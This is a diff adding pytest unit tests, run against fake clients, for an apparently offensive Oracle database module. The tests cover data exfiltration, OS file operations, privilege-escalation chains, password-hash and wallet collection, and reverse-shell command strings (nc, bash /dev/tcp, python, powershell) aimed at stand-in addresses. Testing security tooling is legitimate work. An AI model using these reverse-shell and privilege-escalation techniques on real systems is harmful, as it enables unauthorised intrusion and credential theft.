@@ -620,3 +620,158 @@ def test_oracle_sidecar_artifacts_are_written(tmp_path: Path) -> None:
     assert '"type": "wallet"' in (tmp_path / "oracle.oracle.wallets.jsonl").read_text(encoding="utf-8")
     assert '"type": "file"' in (tmp_path / "oracle.oracle.files.jsonl").read_text(encoding="utf-8")
     assert '"type": "query_rows"' in (tmp_path / "oracle.oracle.exfil.jsonl").read_text(encoding="utf-8")
+
+
+def test_oracle_collect_data_listener_nne_file_and_exfil_branches(
+    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
+) -> None:
+    class RichFakeClient(_FakeOracleClient):
+        def __init__(self) -> None:
+            super().__init__(username="system", password="oracle")
+            self.download_offsets: list[int] = []
+
+        def _read_directory_file_chunk(self, path, *, offset=0, amount=30000):
+            self.download_offsets.append(offset)
+            return {"method": "bfilename", "ok": True, "data": "chunk-data", "error": None}
+
+    local_file = tmp_path / "upload.txt"
+    local_file.write_text("payload", encoding="utf-8")
+    download_file = tmp_path / "download.txt"
+    monkeypatch.setattr(
+        oracle,
+        "_probe_listener_dump",
+        lambda *_args, **_kwargs: {
+            "status_ok": True,
+            "services_ok": True,
+            "summary": {"password_protected": False, "restricted": False},
+            "services": ["FREEPDB1"],
+            "sids": ["FREE"],
+        },
+    )
+    monkeypatch.setattr(
+        oracle,
+        "tns_listener_command",
+        lambda *_args, protocol="tcp", **_kwargs: {"ok": protocol == "tcp"},
+    )
+
+    client = RichFakeClient()
+    data = oracle._collect_oracle_data(
+        client,
+        host="127.0.0.1",
+        port=1521,
+        protocol="tcp",
+        insecure=True,
+        listener_dump=True,
+        nne_check=True,
+        show_pdbs=True,
+        show_users=True,
+        show_roles=True,
+        show_privs=True,
+        show_schemas=True,
+        show_tables=True,
+        schema=None,
+        table=None,
+        dump_rows=True,
+        dump_limit=1,
+        query="select 1 from dual",
+        privesc_check=True,
+        privesc_chain=True,
+        exec_cmd=None,
+        exec_method="auto",
+        reverse_shell="127.0.0.1:4444",
+        reverse_shell_type="nc",
+        fs_mode="auto",
+        os_read="/etc/hostname",
+        os_write=f"{local_file}:/tmp/upload.txt",
+        download=f"/tmp/remote.txt:{download_file}",
+        delete="/tmp/delete.txt",
+        wallet_search=True,
+        hashes=True,
+        sensitive_scan=True,
+        dblink_check=True,
+    )
+
+    assert data["listener_dump"]["services"] == ["FREEPDB1"]
+    assert data["nne_check"]["tcp_available"] is True
+    assert data["rows"][0]["table"] == "ACCOUNTS"
+    assert data["query_rows"] == [{"VALUE": 1}]
+    assert data["exec_result"]["method"] == "scheduler"
+    assert {item["action"] for item in data["file_results"]} == {"read", "write", "download", "delete"}
+    assert download_file.read_text(encoding="utf-8") == "chunk-data"
+    assert data["wallet_findings"]
+    assert data["hashes"]
+    assert data["sensitive_findings"]
+    assert data["db_links"]
+
+
+def test_oracle_exec_reverse_shell_privesc_and_download_helpers(tmp_path: Path) -> None:
+    assert oracle._reverse_shell_command("", "bash") == ""
+    assert "nc 10.0.0.1 4444" in oracle._reverse_shell_command("10.0.0.1:4444", "nc")
+    assert "python3 -c" in oracle._reverse_shell_command("10.0.0.1:4444", "python")
+    assert "powershell" in oracle._reverse_shell_command("10.0.0.1:4444", "powershell")
+    assert "/dev/tcp/10.0.0.1/4444" in oracle._reverse_shell_command("10.0.0.1:4444", "bash")
+    with pytest.raises(ValueError, match="expected local:remote"):
+        oracle._split_path_pair("badpair")
+
+    findings = [
+        {"severity": "CRITICAL", "title": "DBA/SYSDBA capability", "result": True},
+        {"severity": "HIGH", "title": "CREATE JOB / DBMS_SCHEDULER path", "result": True},
+        {"severity": "HIGH", "title": "Java execution privileges", "result": True},
+        {"severity": "HIGH", "title": "Directory read/write or external table path", "result": True},
+        {"severity": "HIGH", "title": "SELECT ANY DICTIONARY / catalog access", "result": True},
+        {"severity": "LOW", "title": "ignored", "result": True},
+    ]
+    chain = oracle._build_privesc_chain(findings)
+    assert {item["path"] for item in chain} >= {
+        "direct_dba",
+        "scheduler_rce",
+        "java_rce",
+        "directory_file_ops",
+        "dictionary_hashes",
+    }
+    executed = oracle._execute_privesc_chain(_FakeOracleClient(username="system", password="oracle"), chain)
+    assert any(item["path"] == "scheduler_rce" and item["ok"] is True for item in executed)
+    assert any(item["path"] == "controlled_dba_grant" and item["ok"] is False for item in executed)
+
+    class ExecFallbackClient(_FakeOracleClient):
+        def scheduler_exec(self, command, *, capture_output=False):
+            return {"ok": False, "error": "scheduler denied", "output_available": False}
+
+        def java_exec(self, command):
+            return {"ok": True, "output": "java-ok", "output_available": True}
+
+    result = oracle._run_oracle_exec(ExecFallbackClient(), "id", "auto")
+    assert result["method"] == "java"
+    assert result["fallback_errors"][0]["method"] == "scheduler"
+    unknown = oracle._run_oracle_exec(ExecFallbackClient(), "id", "unknown")
+    assert unknown["ok"] is False
+    assert "unknown exec method" in unknown["error"]
+
+    class DownloadClient(_FakeOracleClient):
+        def __init__(self, chunks):
+            super().__init__()
+            self.chunks = list(chunks)
+
+        def _read_directory_file_chunk(self, path, *, offset=0, amount=30000):
+            return self.chunks.pop(0)
+
+    failed = oracle._download_oracle_file(
+        DownloadClient([{"ok": False, "method": "bfilename", "error": "read denied"}]),
+        "/remote",
+        str(tmp_path / "new.txt"),
+        fs_mode="directory",
+    )
+    assert failed["ok"] is False
+    assert failed["bytes"] == 0
+
+    resume_target = tmp_path / "resume.txt"
+    resume_target.write_text("old", encoding="utf-8")
+    resumed = oracle._download_oracle_file(
+        DownloadClient([{"ok": True, "data": "new", "method": "bfilename"}]),
+        "/remote",
+        str(resume_target),
+        fs_mode="directory",
+    )
+    assert resumed["ok"] is True
+    assert resumed["resumed"] is True
+    assert resume_target.read_text(encoding="utf-8") == "oldnew"
